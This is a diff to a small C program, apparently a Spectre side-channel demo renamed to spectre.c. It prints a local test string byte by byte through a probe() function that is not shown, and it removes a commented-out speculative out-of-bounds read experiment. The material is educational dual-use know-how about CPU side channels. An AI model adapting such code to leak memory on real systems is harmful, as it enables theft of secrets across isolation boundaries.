@@ -1,5 +1,5 @@
-//Build with Visual Studio command prompt: cl.exe prediction.c
-//Build with GCC: gcc prediction.c
+//Build with Visual Studio command prompt: cl.exe spectre.c
+//Build with GCC: gcc spectre.c
 
 #ifdef _MSC_VER
 #include <intrin.h>
@@ -116,44 +116,17 @@ uint8_t probe(uint8_t* target)
 
 char *secret = "Hello, Abu Coding";
 
-int getStringLength(char *str) {
-    int length = 0;
-    while (str[length] != '\0')
-    {
-        length++;
-    }
-    return length;
-}
-
 int main()
 {
     memset(mem_pages, 1, sizeof(mem_pages));
-    int len = getStringLength(secret);
 
+    int len = strlen(secret);
+
+    printf("secret = ");//sleep(1);
+    
     for(int i = 0; i < len; i++)
     {
         printf("%c", probe(secret++));
     }
     printf("\n");
 }
-
-/*
-int base_array[4] = {1, 2, 3, 4};
-int main()
-{
-    for(int i = 0; i < 3000; i++)
-    {
-        int tmp = -1;
-        if(secret == 0)
-        {
-            tmp = mem_pages[base_array[4]][0];
-            //tmp = mem_pages[*&secret][0];
-        }
-
-        int cached_page = detect_cached_page();
-
-        if(cached_page == 100)
-        printf("cached page:%d, %x, %x\n", cached_page, &base_array[4], &secret);
-    }
-}
-*/
